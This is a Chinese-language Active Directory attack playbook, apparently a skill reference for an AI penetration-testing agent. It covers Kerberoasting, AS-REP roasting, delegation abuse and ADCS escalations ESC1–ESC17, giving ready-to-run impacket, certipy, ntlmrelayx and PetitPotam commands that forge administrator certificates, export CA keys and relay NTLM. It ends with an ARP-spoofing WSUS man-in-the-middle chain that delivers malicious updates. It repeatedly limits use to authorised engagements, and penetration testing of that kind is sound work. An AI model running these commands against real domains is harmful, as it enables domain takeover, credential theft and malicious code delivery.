# Kerberos 与 ADCS（kerberos-and-adcs）

> 配套 `ad-cloud/SKILL.md`、`references/ad-attacks.md`。命令只在**明确授权**的域/账号/主机上执行。
> 占位符：`<domain>`、`<DC_IP>`、`<user>`、`<pass>`、`<target>`、`<CA>`、`<Tpl>`。先同步时间（±5 分钟），再确认账号锁定阈值。

## 0. 前置与降噪

```bash
export DOMAIN='corp.local' DC='10.0.0.10' USER='alice' PASS='P@ssw0rd'
sudo chronyc makestep 2>/dev/null || sudo ntpdate -u "$DC"
nxc smb "$DC" --pass-pol -u '' -p ''        # 先看锁定阈值/密码策略
```

- 同一账号认证失败 2 次即停；不要拿锁定阈值“试试看”。
- Kerberoast/AS-REP 会进 4769/4768；控频，优先单账号/单 SPN。
- 票据/证书只留指纹、有效期、用途，不回传明文。

## 1. Kerberoasting（TGS）

```bash
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC"          # 枚举，不请求票据
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request-user '<svc>' -outputfile evidence/kerb/kerb.hashes      # 降噪：单 SPN
impacket-GetUserSPNs "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -request -outputfile evidence/kerb/kerb-all.hashes               # 全量，仅必要时
hashcat -m 13100 evidence/kerb/kerb.hashes wordlist.txt   # RC4 TGS-REP
hashcat -m 19700 evidence/kerb/kerb.hashes wordlist.txt   # AES128
hashcat -m 19800 evidence/kerb/kerb.hashes wordlist.txt   # AES256
```

判据：拿到可离线破解的 TGS **且**破解出明文，或该 hash 直接完成下一步（PtH/伪造需匹配 etype）。
仅 hash 未破解 = 素材，不能写成“拿到域账号”；失败面（时钟/锁定/仅 AES）见 §7。

## 2. AS-REP Roasting（无预认证）

```bash
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -usersfile users.txt \
  -format hashcat -outputfile evidence/kerb/asrep.hashes
impacket-GetNPUsers "$DOMAIN/" -dc-ip "$DC" -request-user '<user>' \
  -no-pass -format hashcat -outputfile evidence/kerb/asrep-one.hash
hashcat -m 18200 evidence/kerb/asrep.hashes wordlist.txt   # RC4 AS-REP
hashcat -m 19900 evidence/kerb/asrep.hashes wordlist.txt   # AES256
```

判据：破解出明文，或可直接用于预认证/离线复用。
失败判据：账号已启预认证、被锁定、或仅 AES 而字典不匹配。

## 3. 委派

### 3.1 枚举

```bash
impacket-findDelegation "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
# Windows/PowerView
Get-DomainComputer -Unconstrained -Properties dnshostname,samaccountname
Get-DomainUser -TrustedToAuth -Properties samaccountname,msds-allowedtodelegateto
Get-DomainComputer -Properties samaccountname,msds-allowedtoactonbehalfofotheridentity
```

### 3.2 Unconstrained

前提：控制一台 Unconstrained 主机，并让高权账号/主机认证到它。

```bash
Rubeus.exe monitor /interval:5 /nowrap     # Windows 受控主机
sekurlsa::tickets /export                  # 或从内存导出票据
```

判据：捕获高价值账号 TGT，导入后可访问目标服务。
失败判据：只有机器账号 TGT、目标未发起认证、票据已过期。

### 3.3 Constrained（S4U2Self + S4U2Proxy）

```bash
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
export KRB5CCNAME=administrator.ccache
impacket-wmiexec -k -no-pass "$DOMAIN/administrator@<target>"
```

判据：以目标身份拿到服务票据，`whoami` 返回预期账号。
失败判据：SPN 不匹配、`msDS-AllowedToDelegateTo` 未含目标、服务拒绝协议转换。

### 3.4 RBCD

前提：对目标计算机对象有写 `msDS-AllowedToActOnBehalfOfOtherIdentity` 的权限。

```bash
impacket-addcomputer "$DOMAIN/$USER:$PASS" -dc-ip "$DC" \
  -computer-name 'EVIL$' -computer-pass 'P@ss1234'
impacket-rbcd -action write -delegate-to '<target>$' -delegate-from 'EVIL$' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
impacket-getST -spn 'cifs/<target>' -impersonate administrator \
  "$DOMAIN/EVIL$:P@ss1234" -dc-ip "$DC"
```

判据：S4U2Proxy 成功拿到目标票据，并能远程执行。
失败判据：无写权限、目标已有 RBCD 冲突、目标禁用协议转换。

## 4. ADCS 枚举

```bash
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -vulnerable -stdout
certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output evidence/adcs/find
```

记录：CA 名/主机、模板名、`Enroll` 权限、Client Auth / Any Purpose EKU、`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`、manager approval、`Authorized Signatures`、`EDITF_ATTRIBUTESUBJECTALTNAME2`、HTTP 注册端点。
`certipy find` 报 vulnerable **不等于**可利用：须确认当前账号能注册、模板允许目标用法、无审批。

## 5. ESC1-8：条件 → 命令 → 判据

| ESC | 条件（缺一不可） | 判据 |
|---|---|---|
| ESC1 | Enrollee Supplies Subject + Client Auth EKU + 当前账号 `Enroll` + 无审批 | `certipy auth` 返回 administrator TGT/hash 且能访问目标 |
| ESC2 | EKU 为 Any Purpose 或空，低权可注册 | 证书被目标服务接受并完成认证/代签 |
| ESC3 | 可注册 `Certificate Request Agent`，目标模板允许代理注册 | 代签出目标用户证书且 `auth` 得目标 TGT/hash |
| ESC4 | 对模板对象有 `WriteDACL`/`WriteOwner`/`GenericAll` | 改模板后发证成功、`auth` 成功（测后恢复） |
| ESC5 | 对 CA 对象/模板容器/`NTAuthCertificates` 有写权限 | 取得控制后能完成 ESC7/ESC4 的实际利用 |
| ESC6 | CA 开了 `EDITF_ATTRIBUTESUBJECTALTNAME2` | 非 ESC1 模板也签发目标 SAN 并认证成功 |
| ESC7 | CA 上有 `ManageCA` 或 `ManageCertificates` | 批准并检索到目标证书，`auth` 验证通过 |
| ESC8 | CA 暴露 `/certsrv/` + 目标可强制认证 + 未启 EPA/签名 | relay 拿到证书，`certipy auth -pfx` 得目标 TGT/hash |

申请 + 认证（ESC1/2/4/6 共用；ESC4 先备份再改）：

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -ca '<CA>' -template '<Tpl>' -upn "administrator@$DOMAIN"
certipy auth -pfx administrator.pfx -dc-ip "$DC"
# ESC4：-save-old 备份，-write-default-configuration 改成可利用配置
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -template '<Tpl>' -save-old
certipy template -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" \
  -template '<Tpl>' -write-default-configuration
```

ESC3 代理代签、ESC5 读写 PKI 对象 ACL、ESC7 审批、ESC8 relay（触发需单独授权）：

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template 'ESC3-CRA'
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>' \
  -on-behalf-of "$DOMAIN\\administrator" -pfx agent.pfx
dacledit.py -action read -target 'CN=<CA>,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
dacledit.py -action write -rights FullControl -principal "$USER" \
  -target 'CN=<CA>,CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,DC=<domain>,DC=<tld>' \
  "$DOMAIN/$USER:$PASS" -dc-ip "$DC"
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -add-officer "$USER"
certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -issue-request <id>
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -retrieve <id>
certipy relay -ca '<CA>' -template 'DomainController'
impacket-ntlmrelayx -t 'http://<CA_HOST>/certsrv/certfnsh.asp' -smb2support \
  --adcs --template 'DomainController'
petitpotam.py <listener_ip> <target_ip>
```

## 6. NTLM relay 通用前提

```bash
nxc smb <target> -u '' -p '' --gen-relay-list relay_targets.txt
impacket-ntlmrelayx -tf relay_targets.txt -smb2support -socks -of evidence/relay
```

- SMB→SMB 需目标未强制 signing；LDAP relay 需 LDAP signing 未强制；ADCS HTTP 需 EPA 未开。
- 判据：建立可用会话或拿到证书；仅收到入站认证请求不算。`relay_targets.txt` 只放授权目标。

## 7. 失败判据与处理（ESC/委派/relay 共用）

| 现象 | 原因 | 处理 |
|---|---|---|
| `KRB_AP_ERR_SKEW` | 时钟偏移 | 同步后重试一次 |
| `STATUS_ACCOUNT_LOCKED_OUT` | 触发锁定 | 立即停，换账号/来源并报告 |
| Kerberoast 无 RC4 | 账号仅 AES/策略 | 改 AES 模式或放弃该账号 |
| `certipy req` 拒绝 | 无 Enroll/需审批/无 SAN | 查模板 ACL、EKU、manager approval |
| `certipy auth` 失败 | 用途/CA 链/账号状态 | 查 EKU、`NTAuthCertificates`、撤销 |
| ESC5 写不进 | ACL 只读/SACL 保护 | 停手，转 ESC1/ESC6 等可注册面 |
| getST 失败 | SPN/委派属性错 | 核对 `msDS-AllowedToDelegateTo`/RBCD |
| relay 无会话 | signing/EPA | 换目标或改打 ADCS HTTP |

## 8. 证据与清理

- 路径：源主体 → 动作 → 目标主体 → 结果，附命令、时间、返回码。
- 凭据：类型、来源、有效期、SHA256 前 8 位；不回传明文。提权前后留 `whoami /all`、`certipy auth`、`klist`。
- 清理：删临时计算机账号、证书请求、上传工具、计划任务；恢复被改模板/ACL（有备份时）。
- 报告区分“配置缺陷”“拿到证书”“拿到 TGT”“成功横向”，不把前者写成后者。

## 9. ESC9–ESC17：条件 → 命令 → 判据 → 失败判据

> 出处：Troopers 2026（ADCS 新 ESC）、hack.lu 2026（ESC17 WSUS 中继）、ADPATH 2026、SSRN 2026 ADCS 报告（ESC1–16）。
> 与 §4 共用前置：条件位全部来自 `certipy find -json` / CA 注册表只读值，先判定再动手；离线的机器判定用
> `python Tool/skill/ad-cloud/scripts/ad-repro.py --kind adcs-esc --input <find.json>`（见 `01-criteria.md` §1.1）。

### ESC9 强证书绑定关闭（`StrongCertificateBindingEnforcement=0`）

- 条件：KDC 强绑定=0（`HKLM\SYSTEM\CurrentControlSet\Services\Kdc\StrongCertificateBindingEnforcement`），改名后旧证书仍按 UPN 映射；当前主体能改目标账号 UPN。
- 命令：`certipy account update -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -user '<victim>' -upn "administrator@$DOMAIN"`；`certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template 'User'`；`certipy auth -pfx victim.pfx -dc-ip "$DC" -domain "$DOMAIN" -username '<victim>'`（用完立即改回 UPN）。
- 判据：改名后签发的证书以 `<victim>` 完成 PKINIT，返回 `administrator` 的 TGT/ccache 且能读一个只读目标。
- 失败判据：值=2（强绑定）或证书已带 SID 安全扩展；改名被 ACL/审批拒；`auth` 报 `KDC_ERR_CLIENT_NAME_MISMATCH`/`KDC_ERR_CLIENT_REVOKED`。

### ESC10 `CertificateMappingMethods` 含 UPN 位

- 条件：`HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel\CertificateMappingMethods` 含 `0x4`（UPN）或 `0x1/0x2`（subject/issuer）弱映射位，且强绑定未强制；当前主体可注册能自定义 UPN 的模板。
- 命令：`certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template 'User' -upn "administrator@$DOMAIN"`；`certipy auth -pfx administrator.pfx -dc-ip "$DC" -username '<victim>'`（不改名，靠证书 UPN 回落映射）。
- 判据：Schannel/KDC 按证书里的 UPN 映射到目标账号，`auth` 返回目标 TGT/ccache。
- 失败判据：映射位只有 `0x8`（S4U2Self）或 `0`；证书 UPN 与目标账号不一致；`auth` 报 `KDC_ERR_CERTIFICATE_MISMATCH`。

### ESC11 RPC 未强制加密 → NTLM relay 到 ICPR

- 条件：CA 的 `Enforce Encryption for Requests` 为 Disabled（`IF_ENFORCEENCRYPTICERTREQUEST` 未置位）；能强制目标认证且网络可达 CA 的 RPC 端点；授权允许监听/强制认证。
- 命令：`certipy relay -target 'rpc://<CA_HOST>' -ca '<CA>' -template 'DomainController'`；并发只读确认 `nxc smb <CA_HOST> -u '' -p '' -M coerce_plus`（强制认证需单独授权）。
- 判据：relay 日志出现目标机器账号的 ICPR 请求，CA 签发 `<Tpl>` 证书，`certipy auth -pfx` 得目标 TGT/ccache（三步缺一不可）。
- 失败判据：`Enforce Encryption for Requests`=Enabled（要求 PKT_PRIVACY），relay 报 `rpc_s_access_denied`；只能打 HTTP 且 EPA 已开；无强制认证面。

### ESC12 CA 主机本地权限 → 导出 CA 私钥

- 条件：对 CA 主机有本地管理员/服务控制权限（能停起 `CertSvc` 或读 `C:\Windows\System32\CertSvc\Config\*.p12`），授权允许触碰 CA。
- 命令：`certipy ca -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -backup`（需 CA 备份权限）；或本地 `certutil -backupKey <dir>` / `certsrv` 服务离线导出。
- 判据：拿到 CA 私钥/`.p12` 指纹，能用它签出任意 subject 的证书并被目标接受。
- 失败判据：无本地管理权/备份被拒、私钥受 HSM/TPM 保护不可导出、导出后无法签出被 NTAuth 认可的链。

### ESC13 颁发策略 OID 关联组（`msDS-OIDToGroupLink`）

- 条件：模板的 Issuance Policy OID 在 `CN=OID,CN=Public Key Services,...` 上带 `msDS-OIDToGroupLink` 指向特权**通用组**；当前账号可注册该模板且无审批。
- 命令：`certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<Tpl>'`；`certipy auth -pfx user.pfx -dc-ip "$DC"`；`nxc smb "$DC" -k --groups` 或 `whoami /groups` 核对 PAC。
- 判据：TGT 的 PAC 内出现被关联的组 SID，且该组权限在目标资源上生效。
- 失败判据：OID 无 group link、关联组非 universal（link 只对 universal 生效）、模板需审批、证书签发但组未进 PAC。

### ESC14 显式证书映射（`altSecurityIdentities`）

- 条件：目标账号 `altSecurityIdentities` 用弱显式映射（`X509:<I>…<S>…` 无序列号、或仅 `<S>`），或当前主体对该属性有写权限（GenericWrite/WriteProperty）。
- 命令：`certipy find -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -json -output evidence/adcs/find`（读映射）；`certipy req ... -template 'User' -upn "<target>@$DOMAIN"`；写路径用 `ldapmodify -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" -f altsec.ldif`（写操作单独授权并备份原值）。
- 判据：证书仅凭 issuer+subject 就映射到目标账号，`certipy auth -pfx` 返回目标 TGT/ccache。
- 失败判据：映射含 `<SR>`/SKI/SHA1 强绑定、签发 CA 与映射 issuer 不匹配、无写权限、写入被 SACL 保护拒。

### ESC15 旧 schema `Application Policies` / EKU 混淆（CVE-2024-49019）

- 条件：模板 `msPKI-Template-Schema-Version=1`，EKU 走旧 `Application Policies` 扩展，CA 未剥离请求自带的 EKU；当前账号可注册。
- 命令：`certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' -template '<v1Tpl>' -upn "administrator@$DOMAIN" -application-policies 'Client Authentication'`；`certipy auth -pfx administrator.pfx -dc-ip "$DC"`。
- 判据：pfx 的 EKU 出现请求指定的 Client Auth / Smart Card Logon（模板本身没给），且 `auth` 得目标 TGT/ccache。
- 失败判据：schema ≥2、CA/策略剥离请求扩展、模板需审批、`req` 报 `badRequest — denied by policy`。

### ESC16 CA 全局禁用扩展（`szOID_NIST_sha256` 类限制 + 安全扩展缺失）

- 条件：CA 的 `DisableExtensionList` 含 SID 安全扩展 `1.3.6.1.4.1.311.25.2`（及 `szOID_NIST_sha256` 类全局算法/扩展限制），导致全 CA 证书不带 SID → KB5014754 强绑定退化为 ESC9 弱映射、模板安全描述符约束失效。
- 命令：`certutil -config '<CA_HOST>\<CA>' -getreg CA\DisableExtensionList`（只读）；`certipy req ... -template '<Tpl>' -upn "administrator@$DOMAIN"`；`certipy auth -pfx administrator.pfx -dc-ip "$DC"`。
- 判据：`certipy find` 标 ESC16、签发证书**无 SID 扩展**，且仍按 UPN 认证成功拿到目标 TGT/ccache。
- 失败判据：证书 SID 扩展在场、强绑定=2、CA 注册表不可读（标 `unknown`）、模板仍需审批或当前账号无 Enroll。

### ESC17 ADCS + HTTPS WSUS 中继：拿 Server Auth 证书 MitM WSUS 投递恶意更新

- 条件：WSUS 走 HTTPS 且客户端只校验企业 CA（无证书 pinning/mTLS）；能从 ADCS 拿到 `Server Authentication` + WSUS FQDN SAN 的证书（ESC1/ESC6/ESC15 任一）；有 MITM 位置（ARP/DNS）与授权测试客户端。
- 命令：

```bash
certipy req -u "$USER@$DOMAIN" -p "$PASS" -dc-ip "$DC" -ca '<CA>' \
  -template '<Tpl>' -dns 'wsus.<domain>' -application-policies 'Server Authentication'
sudo bettercap -iface eth0 -eval 'set arp.spoof.targets <CLIENT_IP>; arp.spoof on'
mitmproxy --mode reverse:https://wsus.<domain>:8531 --certs 'wsus.<domain>=wsus.pfx' -p 8531
# 仅在授权测试主机上触发检测（不动生产更新策略）
cmd /c 'UsoClient StartScan'   # 或 wuauclt /detectnow
```

- 判据：测试客户端更新代理日志显示从攻击者主机取 metadata 并安装指定 MSI/脚本，标记文件落地；中继证书 subject=WSUS FQDN 且链到企业 CA。
- 失败判据：客户端报 `0x800B0109`/证书不受信、WSUS 启用 pinning/mTLS、ADCS 不给 SAN 或 Server Auth、只走 HTTP+微软内容签名、网络侧无 MITM 位置。

> ESC9–ESC17 的失败面与 §7 同源：先修配置前提或换 ESC，不重复请求（同手法同参数失败两次即停）。

## 10. 边界

- 只在授权域/账号/主机上操作；操作范围等于授权清单（DC、CA、生产业务同样按清单）。
- 持久化/后门/批量喷洒/DoS 按授权单执行；日志只读，伪造/篡改需单独授权。
- 纯 Web 漏洞走 R20；云/K8s 见 `k8s-and-container.md`、`cloud-native.md`。

更长的清单见同目录其它篇。
